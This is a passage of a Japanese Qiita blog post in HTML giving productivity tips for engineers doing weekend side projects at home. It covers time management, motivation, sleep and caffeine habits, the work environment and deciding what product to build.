<span id="過剰なものを減らす" class="fragment"></span><a href="#%E9%81%8E%E5%89%B0%E3%81%AA%E3%82%82%E3%81%AE%E3%82%92%E6%B8%9B%E3%82%89%E3%81%99"><i class="fa fa-link"></i></a>過剰なものを減らす</h2>

<p>次に<b>無駄ではないけれども過剰なものを削ります</b>。</p>

<p>例えば、ブログの記事などを書いている際に、統計などを調べ始めると徹底的に調べたくなりますが、結局は最終的な記事に関係ないことが多いため、一定のレベルでさっさと切り上げたほうがよいでしょう。</p>

<p>また、勉強会や飲み会などで、人脈を広げる活動は大事ですが、特にITエンジニアの週末在宅ワークの場合、成果を出してなんぼであり、いくら人脈を広げても、成果がだせなければ意味がありません。人脈づくりに時間を費やすのも程々にして、<b>成果を出す活動に時間を使いましょう</b>。</p>

<h2>
<span id="スキマ時間のための考え事リスト作業中断と再開を早くするtodoリストを書き出しておく" class="fragment"></span><a href="#%E3%82%B9%E3%82%AD%E3%83%9E%E6%99%82%E9%96%93%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E8%80%83%E3%81%88%E4%BA%8B%E3%83%AA%E3%82%B9%E3%83%88%E4%BD%9C%E6%A5%AD%E4%B8%AD%E6%96%AD%E3%81%A8%E5%86%8D%E9%96%8B%E3%82%92%E6%97%A9%E3%81%8F%E3%81%99%E3%82%8Btodo%E3%83%AA%E3%82%B9%E3%83%88%E3%82%92%E6%9B%B8%E3%81%8D%E5%87%BA%E3%81%97%E3%81%A6%E3%81%8A%E3%81%8F"><i class="fa fa-link"></i></a>スキマ時間のための考え事リスト、作業中断と再開を早くするToDoリストを書き出しておく</h2>

<p>在宅ワークで時間を確保するためには、<b>細切れのすきま時間も無駄にはできません</b>。すきま時間に成果を出すためには、その時間でできることをすぐに思い出す必要があります。<b>考える作業</b>であれば、電車やエレベータの待ち時間のような<b>わずかな間でも十分</b>に成果を出すことができるので、<b>考え事リスト</b>をメモする習慣をつけておくとよいでしょう。</p>

<p>また、平日2時間しか確保できないとすると、作業の途中で中断をしなればならないことも多々あります。そのような場合は、<b>ToDoを常に書き出しておく</b>と、次に作業を再開するのが容易になります。</p>

<p>考え事リスト、ToDoリストによって、細切れの時間を無駄にしないようにしましょう。</p>

<h2>
<span id="1週間のライフサイクルを定義し改善する" class="fragment"></span><a href="#1%E9%80%B1%E9%96%93%E3%81%AE%E3%83%A9%E3%82%A4%E3%83%95%E3%82%B5%E3%82%A4%E3%82%AF%E3%83%AB%E3%82%92%E5%AE%9A%E7%BE%A9%E3%81%97%E6%94%B9%E5%96%84%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>1週間のライフサイクルを定義し、改善する</h2>

<p>平日普通に働いていると、週20時間を確保するだけでも、最初のうちは結構たいへんです。これを継続するためには、<b>生活習慣の中に在宅ワークの時間を組み込む</b>のが重要です。朝方の人は、平日朝2時間と土曜に10時間、夜型の人は平日夕食後に2時間と土曜に10時間といった感じで、ライフサイクルを決めてしまいます。</p>

<p>このように、サイクルを決めると<b>最初は大変</b>ですが、しばらく続けていると<b>慣れてきます</b>。慣れてくると、もっとやり方を工夫して効率を上げようとか、新しいことにチャレンジしてみようとか、思いついてきます。</p>

<p>つまり、生活のサイクルを定義することには、<b>①慣れることによって、大変なことでもできるようになる</b>、<b>②自分の生活サイクルを見えるようにすることによって、無駄を削減したり、やり方を工夫できるようになる</b>という効果があります。</p>

<h2>
<span id="週に1日は休む" class="fragment"></span><a href="#%E9%80%B1%E3%81%AB1%E6%97%A5%E3%81%AF%E4%BC%91%E3%82%80"><i class="fa fa-link"></i></a>週に1日は休む</h2>

<p>上記のように無駄を徹底的に排除した生活をしていると、<b>遊びと刺激が少なく</b>なりがちで、マンネリ化してしまいます。そうなると、発想力も下がってしまうため、<b>週に1日は自由に</b>使って、普段とは違うことをしたほうがよいです。</p>

<p>また、週に1日空けておくと、その一週間で予定通りに仕事が進まなかった場合の<b>バッファーに</b>なります。そのバッファーを使えば、遅れを翌週に持ち越さなくてすみます。</p>

<p>週に1日くらいの余裕が作り出せるよう、計画的に仕事を進めましょう。</p>

<h1>
<span id="意識をコントロールする" class="fragment"></span><a href="#%E6%84%8F%E8%AD%98%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>意識をコントロールする</h1>

<p>家で開発をやっていると、<b>モチベーションの維持が大きな課題</b>となります。ここでは、自分の意識をコントロールして、正しい方向にモチベーションを維持する工夫を紹介します。</p>

<h2>
<span id="モチベーションの方向性の集中" class="fragment"></span><a href="#%E3%83%A2%E3%83%81%E3%83%99%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E6%96%B9%E5%90%91%E6%80%A7%E3%81%AE%E9%9B%86%E4%B8%AD"><i class="fa fa-link"></i></a>モチベーションの方向性の集中</h2>

<p>週末に在宅ワークをやるような人は、元々やる気に溢れており、モチベーションの維持とは無縁と思われるかもしれません。しかし、<b>闇雲にやる気を出せばいい訳ではありません</b>。あれもやりたい、これもやりたいといってやる気を発散させて、<b>いろいろなものに着手すると、逆に何もできなく</b>なります。</p>

<p>まずは<b>一番何をやりたいかを明確に</b>して、そこに<b>やる気とエネルギーを集中させる</b>ことで、一つ一つ成果を上げることができます。</p>

<h2>
<span id="目標設定" class="fragment"></span><a href="#%E7%9B%AE%E6%A8%99%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>目標設定</h2>

<p><b>やる気を集中させるために重要なのは、目標設定</b>です。いつごろまでに何を達成するかを定めれば、目標達成に必要なものにエネルギーを集中せざるをえません。</p>

<p><b>目標は年単位の大雑把なものが3年分</b>くらいと、今年の<b>クオーター単位の目標</b>と、<b>今週の目標があれば十分</b>でしょう。細かく<b>目標とスケジュールを定めることに、あまり時間を使うべきではありません</b>。普段チームで仕事をしている人であれば、個人プロジェクトの管理くらいはほとんど手間をかけずにできるはずです。</p>

<p>目標を立てる際に注意が必要なのが、<b>お金を目標にしない</b>ということです。お金は何かするための手段にすぎないので、それを目標にしてもやることの方向性が定まりません。</p>

<p>また、お金（利益）を中心に設計されたサービスは、提供者中心の発想に陥りがちで、顧客から見て魅力的に映りません。黎明期のサービスは、提供価値と比べてコストの方が高い傾向があり、そのコストを単純に按分して顧客に転嫁すると、高くて悪いサービスに仕上がってしまいます。その結果、成功確率を下げることになるでしょう。</p>

<p>とはいえ、慈善活動ではないので、<b>いつどうやって投下したコストを回収するかの戦略</b>は必須です。それがなければ事業継続は不可能であり、<b>あたり前のことなので目標ではありません</b>。</p>

<h1>
<span id="体をコントロールする" class="fragment"></span><a href="#%E4%BD%93%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>体をコントロールする</h1>

<p>在宅ワークでは自分一人が主力のため、<b>体調をコントロールして最高のパフォーマンスを発揮できるように</b>するのも大事なことです。ここではそのための工夫を紹介します。</p>

<h2>
<span id="睡眠は7時間くらいとる" class="fragment"></span><a href="#%E7%9D%A1%E7%9C%A0%E3%81%AF7%E6%99%82%E9%96%93%E3%81%8F%E3%82%89%E3%81%84%E3%81%A8%E3%82%8B"><i class="fa fa-link"></i></a>睡眠は7時間くらいとる</h2>

<p>毎日充実した生活を送るためには、毎日適切な睡眠時間をとることが重要です。寝不足で眠いとやる気が出ないし、作業効率もよくない。逆に眠りすぎると、今度はやるべきことに割く時間が少なくなってしまいます。</p>

<p>睡眠に関する研究<sup id="fnref4"><a href="#fn4" rel="footnote" title="堀忠雄、『快適睡眠のすすめ (岩波新書)』、岩波新書、2000年7月。">4</a></sup>によると、<b>適切な睡眠時間は7時間</b>だそうです。3時間未満でも大丈夫な人は多いですが、ストレスが多い職種の人にとっては危険なのでやめた方がよいでしょう。逆に、9時間以上寝ても、眠りつかれるだけなので、時間の無駄です。</p>

<p>かつて<b>3時間睡眠</b>の生活に挑戦したことがあります。1週間のうち6日間は3時間睡眠で、日曜だけは好きなだけ寝るという生活です。1か月くらい続けましたが、当時は今ほど忙しくなかったため、1日に21時間も活動時間があると時間に余裕ができすぎて、<b>結局ダラダラ</b>過ごしてしまうので、やめてしまいました。やはり、普通に生活するのが一番のようです。</p>

<h2>
<span id="コーヒーは14時以前に飲む" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%92%E3%83%BC%E3%81%AF14%E6%99%82%E4%BB%A5%E5%89%8D%E3%81%AB%E9%A3%B2%E3%82%80"><i class="fa fa-link"></i></a>コーヒーは14時以前に飲む</h2>

<p>コーヒータイムは気分をリフレッシュさせるのにちょうどよく、カフェインは眠気を飛ばす道具としても使うことができます。しかし、<b>カフェインが体内にあると睡眠が阻害</b>されるそうなので、コーヒーなどの<b>カフェイン</b>がつよいものを飲むなら<b>14時以前</b>がよいようです<sup id="fnref5"><a href="#fn5" rel="footnote" title="コーヒーで眠気をとばすとヤバイ これだけの理由">5</a></sup>。</p>

<p><a href="https://camo.qiitausercontent.com/9a430cbc2f62e27f2fc60f1ad353092ddbeadab5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f61393936613531392d643461642d656539352d656465382d3933613932363637633830342e6a706567" target="_blank" rel="nofollow noopener"><img width="300px" src="https://camo.qiitausercontent.com/9a430cbc2f62e27f2fc60f1ad353092ddbeadab5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f61393936613531392d643461642d656539352d656465382d3933613932363637633830342e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/a996a519-d4ad-ee95-ede8-93a92667c804.jpeg"></a></p>

<h2>
<span id="一番集中力を要するものは午前中にもってくる" class="fragment"></span><a href="#%E4%B8%80%E7%95%AA%E9%9B%86%E4%B8%AD%E5%8A%9B%E3%82%92%E8%A6%81%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE%E3%81%AF%E5%8D%88%E5%89%8D%E4%B8%AD%E3%81%AB%E3%82%82%E3%81%A3%E3%81%A6%E3%81%8F%E3%82%8B"><i class="fa fa-link"></i></a>一番集中力を要するものは午前中にもってくる</h2>

<p>『時間の使い方を科学する』<sup id="fnref6"><a href="#fn6" rel="footnote" title="一川誠、『時間の使い方を科学する　思考は10時から14時、記憶は16時から20時』、2016年7月、PHP新書。">6</a></sup>によると、<b>思考力は10時〜14時に高まる</b>ということなので、<b>開発などの集中力を要することは午前中に</b>行い、メールのチェックやタスク整理やブログの更新などは午後に回すとよいでしょう。</p>

<h2>
<span id="記憶力が必要な勉強の際は昼食を抜いて午後にやる" class="fragment"></span><a href="#%E8%A8%98%E6%86%B6%E5%8A%9B%E3%81%8C%E5%BF%85%E8%A6%81%E3%81%AA%E5%8B%89%E5%BC%B7%E3%81%AE%E9%9A%9B%E3%81%AF%E6%98%BC%E9%A3%9F%E3%82%92%E6%8A%9C%E3%81%84%E3%81%A6%E5%8D%88%E5%BE%8C%E3%81%AB%E3%82%84%E3%82%8B"><i class="fa fa-link"></i></a>記憶力が必要な勉強の際は、昼食を抜いて午後にやる</h2>

<p>個人で仕事をしていると、必要なことはすべて自分で勉強しなければなりません。ネットをちょっと調べてわかるようなレベルのことばかりではなく、何週間も本腰を入れて勉強をしなければならないこともよくあります。</p>

<p>その際にオススメなのが、<b>丸一日は勉強しない</b>ことです。成果を出すための勉強なので、ずっと勉強ばかりしていては意味がありません。</p>

<p>また、午前より<b>午後の方が記憶力が高まる</b><sup id="fnref6"><a href="#fn6" rel="footnote" title="一川誠、『時間の使い方を科学する　思考は10時から14時、記憶は16時から20時』、2016年7月、PHP新書。">6</a></sup>とか、<b>適度な空腹時には記憶力が高まる</b><sup id="fnref7"><a href="#fn7" rel="footnote" title="池谷裕二、『記憶力を強くする―最新脳科学が語る記憶のしくみと鍛え方 (ブルーバックス) 新書』、2001年1月、講談社。">7</a></sup><sup id="fnref8"><a href="#fn8" rel="footnote" title="「記憶力は空腹状態で向上する」という研究結果">8</a></sup>とかいう研究結果もあるので、<b>午前はいつもどおりアウトプットの仕事に</b>費やし、<b>午後は空腹の状態で勉強</b>をすれば多少効果的になるのではないでしょうか。現代人はカロリー過多の傾向にあるので、時間がなければ昼食は抜いても支障はありません。</p>

<h2>
<span id="定期的に体を動かす" class="fragment"></span><a href="#%E5%AE%9A%E6%9C%9F%E7%9A%84%E3%81%AB%E4%BD%93%E3%82%92%E5%8B%95%E3%81%8B%E3%81%99"><i class="fa fa-link"></i></a>定期的に体を動かす</h2>

<p>ずっと座っていると体に悪く<sup id="fnref9"><a href="#fn9" rel="footnote" title="座りすぎの死亡リスクは最大40％増——日本人は世界一座りすぎている">9</a></sup>、眠くなってしまうため、<b>30分〜60分に1回くらいは立ち上がって体を動かす</b>とよいです。筋トレでもよいですが、あまりやりすぎると肩が凝ってしまうので、軽い体操程度に留めるのがよいでしょう。</p>

<h2>
<span id="アイディア出しの際は集中とリラックスを繰り返す" class="fragment"></span><a href="#%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A3%E3%82%A2%E5%87%BA%E3%81%97%E3%81%AE%E9%9A%9B%E3%81%AF%E9%9B%86%E4%B8%AD%E3%81%A8%E3%83%AA%E3%83%A9%E3%83%83%E3%82%AF%E3%82%B9%E3%82%92%E7%B9%B0%E3%82%8A%E8%BF%94%E3%81%99"><i class="fa fa-link"></i></a>アイディア出しの際は、集中とリラックスを繰り返す</h2>

<p>ある研究によると、<b>困難な問題に本腰を入れてしばらく取り組み、生産性の低下やストレスの低下を感じ始めた後に、切り替えて休憩をしてリラックス</b>をすると、<b>創造的なアイディアや問題解決の方法がひらめく「ブレークアウト」（ゾーン）の状態に</b>なる<sup id="fnref10"><a href="#fn10" rel="footnote" title="ハーバート・ベンソン、『ストレスの効果を最大限に生かす　ブレークアウト原則の科学』、2006年12月、Diamond Harvard Business Review。">10</a></sup>そうです。</p>

<p>たしかに、いいアイディアが思い浮かぶのは、会議室の中や机の前ではなくて、別の何かをやっているときのことが多いような気がします。上記の理論に従うと、会議室や机の前で一生懸命考えている時間は無駄ではなかったということになります。</p>

<p>これを応用すると、<b>「アイディア出し（集中）→運動（リラックス）→アイディア出し（集中）→シャワー（リラックス）」</b>のように、一日のサイクルを<b>集中とリラックスの組み合わせで構成</b>するのがよいということになります。もちろん、アイディア出しの部分は開発に置き換えてもよいでしょう。</p>

<h1>
<span id="環境をコントロールする" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>環境をコントロールする</h1>

<p>会社と違って、家では仕事の環境は自分で作らなければなりません。ここでは、自分の<b>仕事のパフォーマンスを上げるための環境づくり</b>の工夫を紹介します。</p>

<h2>
<span id="机場所を変える" class="fragment"></span><a href="#%E6%9C%BA%E5%A0%B4%E6%89%80%E3%82%92%E5%A4%89%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>机・場所を変える</h2>

<p>いつも同じ机と椅子で、同じような姿勢で仕事をしていると、あまり長時間持続できないことがよくあります。会社の労働時間と週20時間を合わせると、かなりの長時間労働になってしまうため、会社と同じように座って仕事をするのは健康によくなく、効率も上がりません。</p>

<p>そのため、家では<b>立って仕事ができるスタンディングデスク</b>や、<b>ソファーで脚を伸ばして仕事ができるクッションテーブル</b>などを準備しておくとよいです。立つのに疲れたら、普通の机に戻ったり、ソファーでリラックスして仕事をしたりと、<b>30分おきくらいに机を変える</b>ことで、無理なく仕事を続けることができます。</p>

<p><a href="https://camo.qiitausercontent.com/5b8675e6435ea741b18d34f1db6afee2d087d07b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f31616639653038362d613437382d666336342d653930392d3462633465376263353130322e6a706567" target="_blank" rel="nofollow noopener"><img width="320px" src="https://camo.qiitausercontent.com/5b8675e6435ea741b18d34f1db6afee2d087d07b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f31616639653038362d613437382d666336342d653930392d3462633465376263353130322e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/1af9e086-a478-fc64-e909-4bc4e7bc5102.jpeg"></a><br>
写真：スタンディングデスク</p>

<p><a href="https://camo.qiitausercontent.com/086183b7639693a3cd417f19c8b235413b8ecad0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f62393631636438382d663932662d303930642d376661302d3864376630643966353863662e6a706567" target="_blank" rel="nofollow noopener"><img width="320px" src="https://camo.qiitausercontent.com/086183b7639693a3cd417f19c8b235413b8ecad0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f62393631636438382d663932662d303930642d376661302d3864376630643966353863662e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/b961cd88-f92f-090d-7fa0-8d7f0d9f58cf.jpeg"></a><br>
写真：クッションテーブル</p>

<p>また、いつも家の中で開発を続けていると飽きてしまうので、たまには<b>コ・ワーキングスペース</b>などに出かけたり、クッションテーブルを車に積んで、<b>景色のよいところ</b>で開発をするのもよいでしょう。</p>

<p><a href="https://camo.qiitausercontent.com/ec1b5a67e4d6e03c7106b6052499bccc48a5c702/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f65643064336637632d653466302d626332372d376534322d6133393435343831626632622e6a706567" target="_blank" rel="nofollow noopener"><img width="320px" src="https://camo.qiitausercontent.com/ec1b5a67e4d6e03c7106b6052499bccc48a5c702/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f65643064336637632d653466302d626332372d376534322d6133393435343831626632622e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/ed0d3f7c-e4f0-bc27-7e42-a3945481bf2b.jpeg"></a><br>
写真：大手町のワーキングスペース</p>

<p><a href="https://camo.qiitausercontent.com/36d92aa79f810f8a647352033ef8880fb5f472df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f38373466336132392d343239622d346566312d626463362d6332653539356464636562622e6a706567" target="_blank" rel="nofollow noopener"><img width="600px" src="https://camo.qiitausercontent.com/36d92aa79f810f8a647352033ef8880fb5f472df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f38373466336132392d343239622d346566312d626463362d6332653539356464636562622e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/874f3a29-429b-4ef1-bdc6-c2e595ddcebb.jpeg"></a><br>
写真：宮島の山頂での開発</p>

<p>普段大きな<b>サブディスプレイ</b>につないで仕事をするのに慣れていると、<b>機動性に欠ける</b>ため、サブディスプレイに頼らなくてもノートPCだけで仕事が進められるようなテクニックを身に着けておくとよいでしょう。なお、開発やデザインの際は大きなディスプレイがあった方が便利なことが多いですが、モニターを増やしすぎると集中力が削がれるという記事もあります<sup id="fnref11"><a href="#fn11" rel="footnote" title="マルチモニターは生産性を向上させる、というのは「神話」なのか、本当なのか？">11</a></sup>。いずれにしろ<b>道具に振り回されない</b>程度の慣れは必要でしょう。</p>

<h2>
<span id="午前は照明を明るめに設定し夜は少し下げる" class="fragment"></span><a href="#%E5%8D%88%E5%89%8D%E3%81%AF%E7%85%A7%E6%98%8E%E3%82%92%E6%98%8E%E3%82%8B%E3%82%81%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%97%E5%A4%9C%E3%81%AF%E5%B0%91%E3%81%97%E4%B8%8B%E3%81%92%E3%82%8B"><i class="fa fa-link"></i></a>午前は照明を明るめに設定し、夜は少し下げる</h2>

<p>昔から明窓浄机という言葉があるように、明るい環境では目が冷めて仕事がやりやすいと思う人が多いのではないでしょうか。照明計画と知的生産性に関する研究<sup id="fnref12"><a href="#fn12" rel="footnote" title="照明計画と知的生産性に関する研究">12</a></sup>によると、オフィスの照明の色や明るさとその変化によって、ストレスや知的生産性に影響があるそうです。一様に明るければよい訳ではなく、<b>朝2時間昼光照明環境に居ると、知的作業においてはプラス</b>だったとのことです。</p>

<p>一般に家の照明だけでは調整が難しいので、<b>電気スタンドや間接照明などで、明かりをコントロール</b>するとよいでしょう。</p>

<p><a href="https://camo.qiitausercontent.com/ba25bc28e47e78cf5ac7aba7846d46393df00df3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f66623537343432622d323562392d303962332d663535382d6333393963303635656461352e6a706567" target="_blank" rel="nofollow noopener"><img width="500px" src="https://camo.qiitausercontent.com/ba25bc28e47e78cf5ac7aba7846d46393df00df3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f66623537343432622d323562392d303962332d663535382d6333393963303635656461352e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/fb57442b-25b9-09b3-f558-c399c065eda5.jpeg"></a><br>
写真：間接照明に使いやすいライト<br>
<a href="https://camo.qiitausercontent.com/69ad2d100ed73fd1f9fe5483c8ce21bc869d01a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f37303539613165382d373932332d363238312d306139312d6161373433386239323031312e6a706567" target="_blank" rel="nofollow noopener"><img width="500px" src="https://camo.qiitausercontent.com/69ad2d100ed73fd1f9fe5483c8ce21bc869d01a8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f37303539613165382d373932332d363238312d306139312d6161373433386239323031312e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/7059a1e8-7923-6281-0a91-aa7438b92011.jpeg"></a><br>
写真：間接照明を点灯すると</p>

<p>また、夜にあまり明るい環境に居ると睡眠を阻害することがあるため、<b>夜は少し照明を落として</b>、リラックスしながら仕事をするとよいでしょう。<br>
<a href="https://camo.qiitausercontent.com/25b881df0b3cafad2a01aaf2dd48b9c826f67e36/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f37633838396438632d643138322d323463372d353162352d6335643837373164643734362e6a706567" target="_blank" rel="nofollow noopener"><img width="300px" src="https://camo.qiitausercontent.com/25b881df0b3cafad2a01aaf2dd48b9c826f67e36/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f37633838396438632d643138322d323463372d353162352d6335643837373164643734362e6a706567" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/7c889d8c-d182-24c7-51b5-c5d8771dd746.jpeg"></a></p>

<h2>
<span id="定期的に換気をして空調で温度をコントロールする" class="fragment"></span><a href="#%E5%AE%9A%E6%9C%9F%E7%9A%84%E3%81%AB%E6%8F%9B%E6%B0%97%E3%82%92%E3%81%97%E3%81%A6%E7%A9%BA%E8%AA%BF%E3%81%A7%E6%B8%A9%E5%BA%A6%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>定期的に換気をして、空調で温度をコントロールする</h2>

<p>同じ部屋にずっとこもっていると、息苦しく感じることがあると思いますので、<b>定期的に換気</b>をしましょう。また、暑かったり寒かったりすると、集中力を持続させにくくなるため、よけいな気がちらないように、自分にとって<b>快適な空調設定</b>を編み出しておきましょう。</p>

<h2>
<span id="テレビを捨てる" class="fragment"></span><a href="#%E3%83%86%E3%83%AC%E3%83%93%E3%82%92%E6%8D%A8%E3%81%A6%E3%82%8B"><i class="fa fa-link"></i></a>テレビを捨てる</h2>

<p>時間のコントロールのところでも書きましたが、平均すると<b>テレビ</b>を見る時間は週の自由時間のうちのかなりの割合を占めています。若い世代ではテレビをあまり見ない人が増えてきましたが、それでも<b>平均すると週に14.5時間</b>くらいを消費しているという調査結果になっています<sup id="fnref3"><a href="#fn3" rel="footnote" title="国民生活時間調査　2015">3</a></sup>。</p>

<p>テレビがあるとつけてしまうとか、テレビはつけてるけどあまり見てないという人が結構いますが、<b>集中して仕事をするためには邪魔</b>なものなので、いっそのこと捨ててしまえばよいでしょう。（少なくとも<b>仕事部屋からは追い出しましょう</b>。）</p>

<h2>
<span id="音楽を使う" class="fragment"></span><a href="#%E9%9F%B3%E6%A5%BD%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>音楽を使う</h2>

<p>家で仕事をしていると、さまざまな生活騒音などがあったりして、集中の邪魔になることがたまにあります。テレビを捨てて音がない部屋では、生活騒音なども比較的目立ってしまいます。そういう事態を防いで、<b>集中力を維持するために、音楽を使う</b>とよいでしょう。</p>

<p>同じ音楽を聞いても人の感じ方は異なるため、自分が集中しやすい音楽を探すとよいでしょう。ただ、何度も聞いて慣れてくると、別にどの曲でも大差がなくなるので、周囲の騒音をかき消して、集中させてくれるものならなんでもよいかもしれません。</p>

<p>単に音を流しておくだけなら、Google HomeやAmazonのAlexaのようなAIスピーカーで十分でしょう。そして、聴き放題などのサービスに契約しておくと、音楽を買い集める手間が省けます。</p>

<h2>
<span id="家事を自動化する" class="fragment"></span><a href="#%E5%AE%B6%E4%BA%8B%E3%82%92%E8%87%AA%E5%8B%95%E5%8C%96%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>家事を自動化する</h2>

<p>勉強を始める前に、机の掃除を始めてしまい、調子にのって部屋の掃除まで始めてしまうといった経験は、多くの人があるのではないでしょうか。</p>

<p>そのように横道に逸れてしまうのを避けるため、<b>家事はできる限り自動化</b>して、余計な時間を使わないようにしておきましょう。</p>

<p>自動化や時短の効果が大きいのは、<b>ロボット掃除機、全自動洗濯乾燥機、電子レンジ、食洗機など</b>です。家事の手間と時間を大幅に減らしてくれて、やるべきことに集中することができます。</p>

<h1>
<span id="アウトプットをコントロールする" class="fragment"></span><a href="#%E3%82%A2%E3%82%A6%E3%83%88%E3%83%97%E3%83%83%E3%83%88%E3%82%92%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>アウトプットをコントロールする</h1>

<p>最後に、そして、<b>最も重要なのが、何を作るのか</b>ということです。売れないもの、誰にも使われないものを作っても、生産性はゼロです。生産性を上げるためには、作るところの効率だけではなく、どのようにしてユーザに届けるかという点についても工夫をこらす必要があります。ここでは、その工夫を紹介します。</p>

<h2>
<span id="1週間に20個以上のアイディアを出しそれを書き留める" class="fragment"></span><a href="#1%E9%80%B1%E9%96%93%E3%81%AB20%E5%80%8B%E4%BB%A5%E4%B8%8A%E3%81%AE%E3%82%A2%E3%82%A4%E3%83%87%E3%82%A3%E3%82%A2%E3%82%92%E5%87%BA%E3%81%97%E3%81%9D%E3%82%8C%E3%82%92%E6%9B%B8%E3%81%8D%E7%95%99%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>1週間に20個以上のアイディアを出し、それを書き留める</h2>

<p>製品を世に出すまでには、幾多の困難を乗り越える必要があり、その際に問題を解決するための数多くのアイディアが必要になります。そして、よく売れている製品を注意深く見ると、ほぼ例外なく数多くのアイディアが含まれていることに気づくでしょう。このように、一つの製品を実現して、それが売れるようにするためには、<b>膨大な数のアイディアが必要</b>となります。</p>

<p>そのため、<b>日頃からアイディアを出す</b>癖をつけておきましょう。目安としては<b>1週間に20個くらい（年間1000個）</b>です。そして、せっかく出した<b>アイディアは記録</b>しておきましょう。それらのアイディアのストックは、困難にぶち当たった時や、新たな転換をしたいときにも役立ちますし、製品の特徴をより尖らせるためにも使うことができるでしょう。</p>

<h2>
<span id="何を作るのか短くわかりやすい言葉でまとめる" class="fragment"></span><a href="#%E4%BD%95%E3%82%92%E4%BD%9C%E3%82%8B%E3%81%AE%E3%81%8B%E7%9F%AD%E3%81%8F%E3%82%8F%E3%81%8B%E3%82%8A%E3%82%84%E3%81%99%E3%81%84%E8%A8%80%E8%91%89%E3%81%A7%E3%81%BE%E3%81%A8%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>何を作るのか、短くわかりやすい言葉でまとめる</h2>

<p>週末にプライベートな時間を使ってわざわざ在宅ワークをしているということは、おおよそ何か作りたいものがあるはずです。もし、まだ具体的に作りたいものが決まっていない場合は、もう少しアイディア出しと思考実験を続けた方がよいでしょう。</p>

<p>作りたいものが決まっている場合は、それが<b>どういったものなのか、短い言葉で説明ができるように</b>しましょう。例えば、Qiitaの場合は、「プログラマの技術情報共有サービス」となっており、誰が何をするためのものかが簡潔に示されています。</p>

<h2>
<span id="使う人を明確にしよく観察するフィールドワークを取り入れる" class="fragment"></span><a href="#%E4%BD%BF%E3%81%86%E4%BA%BA%E3%82%92%E6%98%8E%E7%A2%BA%E3%81%AB%E3%81%97%E3%82%88%E3%81%8F%E8%A6%B3%E5%AF%9F%E3%81%99%E3%82%8B%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E3%83%89%E3%83%AF%E3%83%BC%E3%82%AF%E3%82%92%E5%8F%96%E3%82%8A%E5%85%A5%E3%82%8C%E3%82%8B"><i class="fa fa-link"></i></a>使う人を明確にし、よく観察する（フィールドワークを取り入れる）</h2>

<p>製品を<b>誰に使ってもらうのかを具体的にイメージ</b>し、そのイメージに合致する人を探して現場に行って<b>よく観察</b>します。</p>

<p>フィールドワークのポイントとしては、まずは自分の作ろうとしている製品とは関係なく、あまり<b>予断を持たずに</b>なぜユーザがそのような行動を取るのかを観察したり、質問したりします。</p>

